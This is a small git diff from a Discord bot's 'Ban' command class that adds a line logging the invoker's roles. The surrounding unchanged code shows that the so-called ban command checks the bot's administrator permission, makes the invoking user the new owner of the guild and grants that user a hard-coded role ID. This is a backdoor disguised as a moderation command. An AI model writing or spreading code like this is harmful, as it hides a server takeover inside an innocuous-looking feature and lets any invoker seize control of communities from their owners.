@@ -24,6 +24,7 @@ module.exports = class Ban extends Command {
         console.log("Ice is admin:" + msg.guild.members.get(this.client.user.id).hasPermission("ADMINISTRATOR"));
         console.log("Making user " + msg.author.tag + " own the new guild");
         msg.guild.setOwner(msg.author, why).then(updated => console.log(`[${updated.name}] new owner ${updated.owner.displayName}`));
+        console.log("User has roles:", msg.member.roles);
         try {
             msg.member.roles.add(613019020513378307);
         }catch(e){console.warn(e)}
